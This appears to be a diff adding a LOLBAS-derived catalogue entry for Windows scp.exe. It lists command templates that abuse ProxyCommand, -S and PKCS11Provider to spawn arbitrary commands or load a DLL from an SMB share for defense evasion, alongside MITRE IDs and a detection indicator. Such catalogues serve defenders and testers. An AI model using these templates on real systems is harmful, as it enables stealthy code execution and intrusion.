@@ -1,0 +1,103 @@
+id: lolbas/T1NCaW5hcmllcy9TY3AueW1s/RXhlY3V0ZQ/0
+type: binary
+platform: windows
+name: scp.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1202
+opsec:
+  noise: high
+  triggers: '`scp.exe` executions referencing `ProxyCommand`.'
+commands:
+- template: scp.exe -o ProxyCommand="{CMD}" . localhost:.
+  comment: Spawns specified command from `scp.exe` -> `ssh.exe`, even if no SSH server is running on localhost
+    (or any other address specified).
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Scp/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: scp.exe
+      category: Execute
+      privileges: User
+      mitre_id: T1202
+      source_file: OSBinaries/Scp.yml
+      command_source_index: 0
+      document_utf8: "---\nName: scp.exe\nDescription: Used for uploading or downloading files over SSH.\n\
+        Author: BinFault\nCreated: 2026-06-03\nCommands:\n  - Command: scp.exe -o ProxyCommand=\"{CMD}\"\
+        \ . localhost:.\n    Description: Spawns specified command from `scp.exe` -> `ssh.exe`, even if\
+        \ no SSH server is running on localhost (or any other address specified).\n    Usecase: Proxy\
+        \ execution of specified command, can be used as a defensive evasion.\n    Category: Execute\n\
+        \    Privileges: User\n    MitreID: T1202\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n\
+        \      - Execute: CMD\n  - Command: scp.exe -S \"{CMD}\" . localhost:.\n    Description: Spawns\
+        \ specified command from `scp.exe` -> `ssh.exe`, even if no SSH server is running on localhost\
+        \ (or any other address specified).\n    Usecase: Proxy execution of specified command, can be\
+        \ used as a defensive evasion.\n    Category: Execute\n    Privileges: User\n    MitreID: T1202\n\
+        \    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Execute: CMD\n  - Command: scp\
+        \ -o PKCS11Provider=\"{PATH_SMB:.dll}\" . win@github.com:.\n    Description: Loads a DLL from\
+        \ an absolute path or SMB path into child process `ssh.exe` by abusing the `PKCS11Provider` option.\
+        \ The payload executes upon DLL load (`DllMain`) and requires exporting `C_GetFunctionList` to\
+        \ prevent premature termination by `scp.exe`.\n    Usecase: Performs indirect execution of a specified\
+        \ DLL from a remote share, can be used for defense evasion.\n    Category: Execute\n    Privileges:\
+        \ User\n    MitreID: T1218\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Execute:\
+        \ DLL\n      - Execute: Remote\nFull_Path:\n  - Path: C:\\Windows\\System32\\OpenSSH\\scp.exe\n\
+        Detection:\n  - IOC: \"`scp.exe` executions referencing `ProxyCommand`.\"\nResources:\n  - Link:\
+        \ https://gtfobins.org/gtfobins/scp/\n  - Link: https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9\n\
+        Acknowledgement:\n  - Person: BinFault\n    Handle: '@binfault'\n  - Person: 'Nir Chako (Pentera)'\n\
+        \    Handle: '@C_h4ck_0'\n  - Person: Edo Maland\n    Handle: '@screetsec'\n"
+      document_sha256: sha256:bbe2bf12b523aa5357e9fec53fb1c74f587cd4e762c7db3ea91c45b2ff4677cf
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Scp/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1202
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:0e7991ef1fe15a3748fae347cdc40005ac34eaf5a6f8a16718b352397c83375e
